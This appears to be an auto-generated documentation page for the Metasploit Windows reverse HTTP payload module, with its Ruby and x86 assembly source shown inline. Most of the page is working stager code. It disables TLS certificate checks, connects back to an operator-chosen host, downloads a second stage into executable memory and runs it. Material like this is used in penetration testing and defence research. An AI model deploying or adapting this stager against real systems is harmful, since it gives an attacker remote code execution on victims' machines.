<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  Module: Msf::Payload::Windows::ReverseHttp
  
    &mdash; Documentation by YARD 0.8.7.4
  
</title>

  <link rel="stylesheet" href="../../../css/style.css" type="text/css" charset="utf-8" />

  <link rel="stylesheet" href="../../../css/common.css" type="text/css" charset="utf-8" />

<script type="text/javascript" charset="utf-8">
  hasFrames = window.top.frames.main ? true : false;
  relpath = '../../../';
  framesUrl = "../../../frames.html#!Msf/Payload/Windows/ReverseHttp.html";
</script>


  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>


  </head>
  <body>
    <div id="header">
      <div id="menu">
  
    <a href="../../../_index.html">Index (R)</a> &raquo;
    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span>
     &raquo; 
    <span class="title">ReverseHttp</span>
  

  <div class="noframes"><span class="title">(</span><a href="." target="_top">no frames</a><span class="title">)</span></div>
</div>

      <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="../../../class_list.html">
      Class List
    </a>
  
    <a class="full_list_link" id="method_list_link"
        href="../../../method_list.html">
      Method List
    </a>
  
    <a class="full_list_link" id="file_list_link"
        href="../../../file_list.html">
      File List
    </a>
  
</div>
      <div class="clear"></div>
    </div>

    <iframe id="search_frame"></iframe>

    <div id="content"><h1>Module: Msf::Payload::Windows::ReverseHttp
  
  
  
</h1>

<dl class="box">
  
  
    
  
    
      <dt class="r1">Includes:</dt>
      <dd class="r1"><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span>, <span class='object_link'><a href="BlockApi.html" title="Msf::Payload::Windows::BlockApi (module)">BlockApi</a></span>, <span class='object_link'><a href="Exitfunk.html" title="Msf::Payload::Windows::Exitfunk (module)">Exitfunk</a></span></dd>
      
    
  
  
    <dt class="r2">Included in:</dt>
    <dd class="r2"><span class='object_link'><a href="ReverseHttps.html" title="Msf::Payload::Windows::ReverseHttps (module)">ReverseHttps</a></span>, <span class='object_link'><a href="ReverseWinHttp.html" title="Msf::Payload::Windows::ReverseWinHttp (module)">ReverseWinHttp</a></span></dd>
    
  
  
    <dt class="r1 last">Defined in:</dt>
    <dd class="r1 last">lib/msf/core/payload/windows/reverse_http.rb</dd>
  
</dl>
<div class="clear"></div>








  
    <h2>
      Instance Method Summary
      <small>(<a href="#" class="summary_toggle">collapse</a>)</small>
    </h2>

    <ul class="summary">
      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#asm_reverse_http-instance_method" title="#asm_reverse_http (instance method)">- (Object) <strong>asm_reverse_http</strong>(opts = {}) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Dynamic payload generation.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#generate-instance_method" title="#generate (instance method)">- (Object) <strong>generate</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Generate the first stage.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#generate_reverse_http-instance_method" title="#generate_reverse_http (instance method)">- (Object) <strong>generate_reverse_http</strong>(opts = {}) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Generate and compile the stager.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#generate_small_uri-instance_method" title="#generate_small_uri (instance method)">- (Object) <strong>generate_small_uri</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Generate the URI for the initial stager.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#generate_uri-instance_method" title="#generate_uri (instance method)">- (Object) <strong>generate_uri</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Generate the URI for the initial stager.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#initialize-instance_method" title="#initialize (instance method)">- (Object) <strong>initialize</strong>(*args) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Register reverse_http specific options.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#required_space-instance_method" title="#required_space (instance method)">- (Object) <strong>required_space</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Determine the maximum amount of space required for the features requested.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#stage_over_connection%3F-instance_method" title="#stage_over_connection? (instance method)">- (Boolean) <strong>stage_over_connection?</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Do not transmit the stage over the connection.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#wfs_delay-instance_method" title="#wfs_delay (instance method)">- (Object) <strong>wfs_delay</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Always wait at least 20 seconds for this payload (due to staging delays).</p>
</div></span>
  
</li>

      
    </ul>
  


  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Exitfunk.html" title="Msf::Payload::Windows::Exitfunk (module)">Exitfunk</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Exitfunk.html#asm_exitfunk-instance_method" title="Msf::Payload::Windows::Exitfunk#asm_exitfunk (method)">#asm_exitfunk</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="BlockApi.html" title="Msf::Payload::Windows::BlockApi (module)">BlockApi</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="BlockApi.html#asm_block_api-instance_method" title="Msf::Payload::Windows::BlockApi#asm_block_api (method)">#asm_block_api</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../Windows.html#apply_prepends-instance_method" title="Msf::Payload::Windows#apply_prepends (method)">#apply_prepends</a></span>, <span class='object_link'><a href="../Windows.html#exit_types-class_method" title="Msf::Payload::Windows.exit_types (method)">exit_types</a></span>, <span class='object_link'><a href="../Windows.html#handle_intermediate_stage-instance_method" title="Msf::Payload::Windows#handle_intermediate_stage (method)">#handle_intermediate_stage</a></span>, <span class='object_link'><a href="../Windows.html#replace_var-instance_method" title="Msf::Payload::Windows#replace_var (method)">#replace_var</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="PrependMigrate.html" title="Msf::Payload::Windows::PrependMigrate (module)">PrependMigrate</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="PrependMigrate.html#apply_prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#apply_prepend_migrate (method)">#apply_prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate (method)">#prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate%3F-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate? (method)">#prepend_migrate?</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate_64-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate_64 (method)">#prepend_migrate_64</a></span></p>


  <div id="instance_method_details" class="method_details_list">
    <h2>Instance Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="asm_reverse_http-instance_method">
  
    - (<tt>Object</tt>) <strong>asm_reverse_http</strong>(opts = {}) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Dynamic payload generation</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_http.rb', line 122</span>

<span class='kw'>def</span> <span class='id identifier rubyid_asm_reverse_http'>asm_reverse_http</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>

  <span class='comment'>#
</span>  <span class='comment'># options should contain:
</span>  <span class='comment'>#    ssl:     (true|false)
</span>  <span class='comment'>#    url:     &quot;/url_to_request&quot;
</span>  <span class='comment'>#   host:     [hostname]
</span>  <span class='comment'>#   port:     [port]
</span>  <span class='comment'># exitfunk:   [process|thread|seh|sleep]
</span>  <span class='comment'>#
</span>
  <span class='id identifier rubyid_http_open_flags'>http_open_flags</span> <span class='op'>=</span> <span class='int'>0</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:ssl</span><span class='rbracket'>]</span>
      <span class='comment'>#;0x80000000 | ; INTERNET_FLAG_RELOAD
</span>      <span class='comment'>#;0x04000000 | ; INTERNET_NO_CACHE_WRITE
</span>      <span class='comment'>#;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
</span>      <span class='comment'>#;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
</span>      <span class='comment'>#;0x00000200 | ; INTERNET_FLAG_NO_UI
</span>      <span class='comment'>#;0x00800000 | ; INTERNET_FLAG_SECURE
</span>      <span class='comment'>#;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
</span>      <span class='comment'>#;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
</span>    <span class='id identifier rubyid_http_open_flags'>http_open_flags</span> <span class='op'>=</span> <span class='lparen'>(</span> <span class='int'>0x80000000</span> <span class='op'>|</span> <span class='int'>0x04000000</span> <span class='op'>|</span> <span class='int'>0x00400000</span> <span class='op'>|</span> <span class='int'>0x00200000</span> <span class='op'>|</span> <span class='int'>0x00000200</span> <span class='op'>|</span> <span class='int'>0x00800000</span> <span class='op'>|</span> <span class='int'>0x00002000</span> <span class='op'>|</span> <span class='int'>0x00001000</span> <span class='rparen'>)</span>
  <span class='kw'>else</span>
    <span class='comment'>#;0x80000000 | ; INTERNET_FLAG_RELOAD
</span>    <span class='comment'>#;0x04000000 | ; INTERNET_NO_CACHE_WRITE
</span>    <span class='comment'>#;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
</span>    <span class='comment'>#;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
</span>    <span class='comment'>#;0x00000200   ; INTERNET_FLAG_NO_UI
</span>    <span class='id identifier rubyid_http_open_flags'>http_open_flags</span> <span class='op'>=</span> <span class='lparen'>(</span> <span class='int'>0x80000000</span> <span class='op'>|</span> <span class='int'>0x04000000</span> <span class='op'>|</span> <span class='int'>0x00400000</span> <span class='op'>|</span> <span class='int'>0x00200000</span> <span class='op'>|</span> <span class='int'>0x00000200</span> <span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
    ;-----------------------------------------------------------------------------;
    ; Author: HD Moore
    ; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
    ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
    ; Version: 1.0
    ;-----------------------------------------------------------------------------;

    ; Input: EBP must be the address of &#39;api_call&#39;.
    ; Output: EDI will be the socket for the connection to the server
    ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
    load_wininet:
      push 0x0074656e        ; Push the bytes &#39;wininet&#39;,0 onto the stack.
      push 0x696e6977        ; ...
      push esp               ; Push a pointer to the &quot;wininet&quot; string on the stack.
      push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )
      call ebp               ; LoadLibraryA( &quot;wininet&quot; )

    set_retry:
      push.i8 8              ; retry 8 times should be enough
      pop edi
      xor ebx, ebx           ; push 8 zeros ([1]-[8])
      mov ecx, edi
    push_zeros:
      push ebx
      loop push_zeros

    internetopen:
                             ; DWORD dwFlags [1]
                             ; LPCTSTR lpszProxyBypass (NULL) [2]
                             ; LPCTSTR lpszProxyName (NULL) [3]
                             ; DWORD dwAccessType (PRECONFIG = 0) [4]
                             ; LPCTSTR lpszAgent (NULL) [5]
      push 0xA779563A        ; hash( &quot;wininet.dll&quot;, &quot;InternetOpenA&quot; )
      call ebp

    internetconnect:
                             ; DWORD_PTR dwContext (NULL) [6]
                             ; dwFlags [7]
      push.i8 3              ; DWORD dwService (INTERNET_SERVICE_HTTP)
      push ebx               ; password (NULL)
      push ebx               ; username (NULL)
      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>    ; PORT
      call got_server_uri    ; double call to get pointer for both server_uri and
    server_uri:              ;  server_host; server_uri is saved in EDI for later
      db &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:url</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;, 0x00
    got_server_host:
      push eax               ; HINTERNET hInternet
      push 0xC69F8957        ; hash( &quot;wininet.dll&quot;, &quot;InternetConnectA&quot; )
      call ebp

    httpopenrequest:
                             ; dwContext (NULL) [8]
      push </span><span class='embexpr_beg'>#{</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%.8x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_http_open_flags'>http_open_flags</span><span class='embexpr_end'>}</span><span class='tstring_content'>   ; dwFlags
      push ebx               ; accept types
      push ebx               ; referrer
      push ebx               ; version
      push edi               ; server URI
      push ebx               ; method
      push eax               ; hConnection
      push 0x3B2E55EB        ; hash( &quot;wininet.dll&quot;, &quot;HttpOpenRequestA&quot; )
      call ebp
      xchg esi, eax          ; save hHttpRequest in esi

    send_request:
    </span><span class='tstring_end'>^</span></span>

  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:ssl</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
      ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &amp;dwFlags, sizeof (dwFlags) );
      set_security_options:
        push 0x00003380
          ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
          ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
          ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
          ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
          ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
        mov eax, esp
        push.i8 4              ; sizeof(dwFlags)
        push eax               ; &amp;dwFlags
        push.i8 31             ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
        push esi               ; hHttpRequest
        push 0x869E4675        ; hash( &quot;wininet.dll&quot;, &quot;InternetSetOptionA&quot; )
        call ebp
      </span><span class='tstring_end'>^</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
    httpsendrequest:
      push ebx               ; lpOptional length (0)
      push ebx               ; lpOptional (NULL)
      push ebx               ; dwHeadersLength (0)
      push ebx               ; lpszHeaders (NULL)
      push esi               ; hHttpRequest
      push 0x7B18062D        ; hash( &quot;wininet.dll&quot;, &quot;HttpSendRequestA&quot; )
      call ebp
      test eax,eax
      jnz allocate_memory

    try_it_again:
      dec edi
      jnz send_request

    ; if we didn&#39;t allocate before running out of retries, bail out
    </span><span class='tstring_end'>^</span></span>

    <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
      <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
        failure:
          call exitfunk
        </span><span class='tstring_end'>^</span></span>
    <span class='kw'>else</span>
      <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
        failure:
          push 0x56A2B5F0        ; hardcoded to exitprocess for size
          call ebp
        </span><span class='tstring_end'>^</span></span>
    <span class='kw'>end</span>

    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
      allocate_memory:
        push.i8 0x40           ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; MEM_COMMIT
        push 0x00400000        ; Stage allocation (4Mb ought to do us)
        push ebx               ; NULL as we dont care where the allocation is
        push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )
        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

      download_prep:
        xchg eax, ebx          ; place the allocated base address in ebx
        push ebx               ; store a copy of the stage base address on the stack
        push ebx               ; temporary storage for bytes read count
        mov edi, esp           ; &amp;bytesRead

      download_more:
        push edi               ; &amp;bytesRead
        push 8192              ; read length
        push ebx               ; buffer
        push esi               ; hRequest
        push 0xE2899612        ; hash( &quot;wininet.dll&quot;, &quot;InternetReadFile&quot; )
        call ebp

        test eax,eax           ; download failed? (optional?)
        jz failure

        mov eax, [edi]
        add ebx, eax           ; buffer += bytes_received

        test eax,eax           ; optional?
        jnz download_more      ; continue until it returns 0
        pop eax                ; clear the temporary storage

      execute_stage:
        ret                    ; dive into the stored stage address

      got_server_uri:
        pop edi
        call got_server_host

      server_host:
        db &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;, 0x00
      </span><span class='tstring_end'>^</span></span>

    <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
      <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_asm_exitfunk'>asm_exitfunk</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
    <span class='kw'>end</span>
  <span class='id identifier rubyid_asm'>asm</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="generate-instance_method">
  
    - (<tt>Object</tt>) <strong>generate</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Generate the first stage</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_http.rb', line 37</span>

<span class='kw'>def</span> <span class='id identifier rubyid_generate'>generate</span>
  <span class='comment'># Generate the simple version of this stager if we don&#39;t have enough space
</span>  <span class='kw'>if</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_available_space'>available_space</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span> <span class='op'>||</span> <span class='id identifier rubyid_required_space'>required_space</span> <span class='op'>&gt;</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_available_space'>available_space</span>
    <span class='kw'>return</span> <span class='id identifier rubyid_generate_reverse_http'>generate_reverse_http</span><span class='lparen'>(</span>
      <span class='label'>ssl:</span>  <span class='kw'>false</span><span class='comma'>,</span>
      <span class='label'>host:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
      <span class='label'>port:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
      <span class='label'>url:</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_generate_uri_checksum'>generate_uri_checksum</span><span class='lparen'>(</span><span class='const'>Msf</span><span class='op'>::</span><span class='const'>Handler</span><span class='op'>::</span><span class='const'>ReverseHttp</span><span class='op'>::</span><span class='const'>URI_CHECKSUM_INITW</span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_conf'>conf</span> <span class='op'>=</span> <span class='lbrace'>{</span>
    <span class='label'>ssl:</span>  <span class='kw'>false</span><span class='comma'>,</span>
    <span class='label'>host:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
    <span class='label'>port:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
    <span class='label'>url:</span>  <span class='id identifier rubyid_generate_uri'>generate_uri</span><span class='comma'>,</span>
    <span class='label'>exitfunk:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>EXITFUNC</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='rbrace'>}</span>

  <span class='id identifier rubyid_generate_reverse_http'>generate_reverse_http</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="generate_reverse_http-instance_method">
  
    - (<tt>Object</tt>) <strong>generate_reverse_http</strong>(opts = {}) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Generate and compile the stager</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


61
62
63
64
65
66
67
68
69
70
71</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_http.rb', line 61</span>

<span class='kw'>def</span> <span class='id identifier rubyid_generate_reverse_http'>generate_reverse_http</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_combined_asm'>combined_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
    cld                    ; Clear the direction flag.
    call start             ; Call start, this pushes the address of &#39;api_call&#39; onto the stack.
    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_asm_block_api'>asm_block_api</span><span class='embexpr_end'>}</span><span class='tstring_content'>
    start:
      pop ebp
    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_asm_reverse_http'>asm_reverse_http</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
  </span><span class='tstring_end'>^</span></span>
  <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X86</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_combined_asm'>combined_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="generate_small_uri-instance_method">
  
    - (<tt>Object</tt>) <strong>generate_small_uri</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Generate the URI for the initial stager</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


95
96
97</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_http.rb', line 95</span>

<span class='kw'>def</span> <span class='id identifier rubyid_generate_small_uri'>generate_small_uri</span>
  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_generate_uri_checksum'>generate_uri_checksum</span><span class='lparen'>(</span><span class='const'>Msf</span><span class='op'>::</span><span class='const'>Handler</span><span class='op'>::</span><span class='const'>ReverseHttp</span><span class='op'>::</span><span class='const'>URI_CHECKSUM_INITW</span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="generate_uri-instance_method">
  
    - (<tt>Object</tt>) <strong>generate_uri</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Generate the URI for the initial stager</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


76
77
78
79
80
81
82
83
84
85
86
87
88
89
90</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_http.rb', line 76</span>

<span class='kw'>def</span> <span class='id identifier rubyid_generate_uri'>generate_uri</span>

  <span class='id identifier rubyid_uri_req_len'>uri_req_len</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTPStagerURILength</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span>

  <span class='comment'># Choose a random URI length between 30 and 255 bytes
</span>  <span class='kw'>if</span> <span class='id identifier rubyid_uri_req_len'>uri_req_len</span> <span class='op'>==</span> <span class='int'>0</span>
    <span class='id identifier rubyid_uri_req_len'>uri_req_len</span> <span class='op'>=</span> <span class='int'>30</span> <span class='op'>+</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>256</span><span class='op'>-</span><span class='int'>30</span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_uri_req_len'>uri_req_len</span> <span class='op'>&lt;</span> <span class='int'>5</span>
    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>ArgumentError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Minimum HTTPStagerURILength is 5</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>end</span>

  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_generate_uri_checksum'>generate_uri_checksum</span><span class='lparen'>(</span><span class='const'>Msf</span><span class='op'>::</span><span class='const'>Handler</span><span class='op'>::</span><span class='const'>ReverseHttp</span><span class='op'>::</span><span class='const'>URI_CHECKSUM_INITW</span><span class='comma'>,</span> <span class='id identifier rubyid_uri_req_len'>uri_req_len</span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
